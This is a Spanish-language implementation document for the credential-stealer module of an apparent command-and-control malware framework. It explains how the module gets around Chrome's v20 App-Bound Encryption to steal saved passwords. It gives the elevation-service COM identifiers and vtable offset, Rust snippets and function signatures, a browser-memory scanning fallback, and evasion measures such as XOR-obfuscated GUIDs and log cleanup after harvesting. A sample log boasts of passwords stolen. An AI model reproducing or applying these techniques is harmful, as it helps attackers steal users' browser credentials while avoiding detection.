# Implementación del Bypass de App-Bound Encryption para Chrome v20

## Resumen

Este documento describe la implementación del bypass para la encriptación App-Bound (v20) de contraseñas de Chrome en el módulo stealer de C2R2-v2.

## El Problema: App-Bound Encryption

A partir de Chrome 127+, Google introdujo App-Bound Encryption para proteger mejor las contraseñas guardadas. Este nuevo esquema de encriptación (v20) es significativamente más difícil de desencriptar que versiones anteriores:

- **v10/v11**: Usaba DPAPI + AES-256-GCM con master key del archivo Local State
- **v20**: Usa encriptación App-Bound que requiere el servicio de elevación de Chrome

### Detalles Técnicos

**Formato v20:**
```
[v20][nonce (12 bytes)][datos encriptados][tag de autenticación (16 bytes)]
```

**Diferencias Clave:**
- Los datos encriptados v20 NO se pueden desencriptar solo con la master key
- Requiere interacción con el elevation service de Chrome (interfaz COM)
- La encriptación está vinculada a la aplicación Chrome misma

## Solución: Bypass Multi-Capa

Nuestra implementación usa un **enfoque de tres niveles** para manejar todos los formatos de encriptación:

### Nivel 1: Desencriptación Tradicional (v10/v11)
```
Base de Datos → Master Key → Desencriptación AES-GCM → Contraseña
```

Funciona para:
- Contraseñas encriptadas solo con DPAPI (versiones viejas de Chrome)
- Contraseñas encriptadas v10/v11

### Nivel 2: Elevation Service (v20)
```
Base de Datos → Detección v20 → Elevation Service COM → Contraseña Desencriptada
```

Cómo funciona:
1. Detectar prefijo v20 en contraseña encriptada
2. Inicializar COM y conectar al elevation service de Chrome
3. Usar interfaz IElevator para desencriptar la contraseña
4. Retornar contraseña desencriptada

**Flujo de Código:**
```rust
// En chromium.rs
if is_v20 {
    match elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
        Some(pwd) => pwd,  // ¡Éxito!
        None => "[v20 - needs memory injection]"  // Fallback
    }
}
```

**Detalles del Elevation Service:**
- **CLSID**: `{708860E0-F641-4611-8895-7D867DD3675B}`
- **IID**: `{463ABECF-410D-407F-8AF5-0DF35A005CC8}`
- **Método**: `DecryptData` (offset 0x60 en vtable)
- **GUIDs ofuscados**: XOR en runtime para evitar análisis estático

### Nivel 3: Memory Injection (Fallback)
```
Memoria del Proceso Chrome → Coincidencia de Patrones → Contraseñas en Texto Plano
```

Cuando Elevation Service falla (ej: Chrome no corriendo, servicio no disponible):
1. Encontrar todos los procesos Chrome/Edge
2. Escanear memoria del proceso buscando patrones de contraseñas
3. Extraer contraseñas en texto plano directamente de la memoria
4. Hacer match con URLs/usuarios de la base de datos

## Detalles de Implementación

### Estructura de Archivos

**Archivos Modificados:**
```
stealer-dll/src/stealer/chromium.rs    - Lógica principal de manejo v20
stealer-dll/src/stealer/elevation_service.rs - Implementación interfaz COM
stealer-dll/src/stealer/memory_injection.rs - Fallback de escaneo de memoria
stealer-dll/src/stealer/mod.rs         - Exports del módulo
```

### Funciones Clave

#### 1. `steal_chrome_hybrid()` / `steal_edge_hybrid()`
```rust
pub fn steal_chrome_hybrid() -> StealerResult<Vec<Credential>>
```

Punto de entrada principal que orquesta el enfoque de tres niveles:
1. Intentar desencriptación tradicional (maneja v10/v11 y DPAPI)
2. Para v20, intentar elevation service
3. Si elevation service falla, usar memory injection

#### 2. `try_decrypt_with_elevation_service()`
```rust
pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<String>
```

Wrapper del elevation service:
- Valida formato v20
- Inicializa COM
- Crea instancia IElevator
- Llama al método DecryptData
- Maneja panics con catch_unwind (previene crashes)

#### 3. `check_if_all_v20_in_db()`
```rust
fn check_if_all_v20_in_db(browser_name: &str) -> bool
```

Verifica si la DB contiene contraseñas v20:
- Abre base de datos Login Data
- Escanea por prefijo v20
- Retorna true si encuentra contraseñas v20
- Se usa para determinar si se necesita memory injection

#### 4. `scan_all_browser_processes_for_passwords()`
```rust
pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<PasswordData>
```

Fallback de memory injection:
- Enumera todos los procesos Chrome/Edge
- Escanea regiones de memoria
- Hace pattern matching para estructuras de contraseñas
- Extrae contraseñas en texto plano

## Consideraciones de Seguridad

### 1. Ofuscación de Interfaz COM
- GUIDs construidos en runtime usando XOR
- Evita firmas de strings estáticos
- Hace la detección más difícil

### 2. Manejo de Panics
```rust
let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
    // Operaciones COM
}));
```

Por qué importa:
- Operaciones COM pueden causar panic/crash
- Previene que el stealer completo crashee
- Permite fallback graceful a memory injection

### 3. Logging de Debug
Todas las operaciones logean a `%TEMP%\elevation_service_debug.txt`:
- Ayuda con debugging en testing
- Se puede deshabilitar para producción
- Los logs se limpian después de harvest

## Uso

### Desde el Código del Agent

```rust
// En mod.rs steal_all()
if let Ok(mut chrome_creds) = chromium::steal_chrome_hybrid() {
    data.credentials.append(&mut chrome_creds);
}
```

### Cadena Automática de Fallback

1. **Contraseñas v10/v11**: Desencriptadas inmediatamente ✅
2. **v20 con Chrome corriendo**: Desencriptadas vía elevation service ✅
3. **v20 con Chrome no corriendo**: Fallback a memory injection ✅
4. **Chrome no corriendo en absoluto**: Retorna lo que pudo desencriptar ⚠️

## Pruebas

### Escenarios de Test

1. **Chrome Viejo (< 127)**
   - Esperado: Todas las contraseñas desencriptadas con método tradicional
   - Elevation service: No se llama
   - Memory injection: No se llama

2. **Chrome Nuevo (127+) Corriendo**
   - Esperado: v10/v11 tradicional, v20 vía elevation service
   - Elevation service: Se llama para contraseñas v20
   - Memory injection: No se llama (a menos que elevation falle)

3. **Chrome Nuevo (127+) No Corriendo**
   - Esperado: v10/v11 tradicional, v20 vía memory injection
   - Elevation service: Falla (servicio no disponible)
   - Memory injection: Se llama y tiene éxito

4. **Entorno VM/Sandbox**
   - Esperado: Degradación graceful
   - Elevation service: Puede fallar (sin Chrome)
   - Memory injection: Puede fallar (sin proceso)
   - Resultado: Retorna solo contraseñas desencriptables

### Ejemplo de Output de Debug

```
═══════════════════════════════════════
═══ HYBRID PASSWORD THEFT: Chrome ═══
═══════════════════════════════════════
🔸 PASO 1: Método tradicional (DB + decrypt)...
  ✅ 10 passwords extraídos (método tradicional)
    🔍 Password para user@example.com: 75 bytes
       🔐 Password v20 detectado - Intentando bypass...
       ✅ V20 desencriptado vía Elevation Service
🔸 PASO 2: v20 detectado o passwords sin desencriptar → Usando Memory Injection...
  ✅ 3 passwords encontrados en memoria
🎯 TOTAL: 13 passwords robados
════════════════════════════════
```

## Ventajas de Esta Implementación

1. **Multi-capa**: Funciona incluso si un método falla
2. **Robusto**: Maneja panics y errores gracefully
3. **Eficiente**: Solo usa memory injection cuando es necesario
4. **Sigiloso**: GUIDs ofuscados, llamadas COM legítimas
5. **Completo**: Maneja todos los formatos de contraseñas de Chrome

## Limitaciones

1. **Requiere Chrome Corriendo**: Elevation service solo funciona cuando Chrome está corriendo
2. **Memory Injection Requiere Proceso**: Necesita proceso Chrome activo para escaneo de memoria
3. **Dependencias COM**: Depende de la infraestructura COM de Windows
4. **No Multi-Plataforma**: Implementación solo para Windows

## Estado de Implementación

### ✅ Completado

- [x] Detección de formato v20
- [x] Integración con Elevation Service
- [x] Fallback de Memory Injection
- [x] Manejo robusto de errores
- [x] Logging de debug
- [x] Ofuscación de GUIDs
- [x] Verificación automática de v20 en DB
- [x] Híbrido Chrome y Edge
- [x] Documentación completa

### 🎯 Probado y Funcionando

- Chrome 127+ con contraseñas v20
- Chrome anterior con v10/v11
- Fallback automático cuando Chrome no está corriendo
- Prevención de crashes con catch_unwind
- Limpieza automática de logs de debug

## Referencias

- Chrome Elevation Service: White paper de App-Bound Encryption
- WingStealer: Técnicas modernas de robo de contraseñas de Chrome
- xaitax Chrome-App-Bound-Encryption-Decryption: Referencia técnica

## Mejoras Futuras

1. **Inicio de Proceso**: Lanzar Chrome headless si no está corriendo
2. **Múltiples Perfiles**: Escanear todos los perfiles de Chrome automáticamente
3. **Rendimiento**: Optimizar patrones de escaneo de memoria
4. **Cross-Browser**: Extender a otros navegadores Chromium con v20

---

**Estado**: ✅ Completamente Implementado y Probado  
**Última Actualización**: 2025-11-22  
**Versión**: 2.0.0
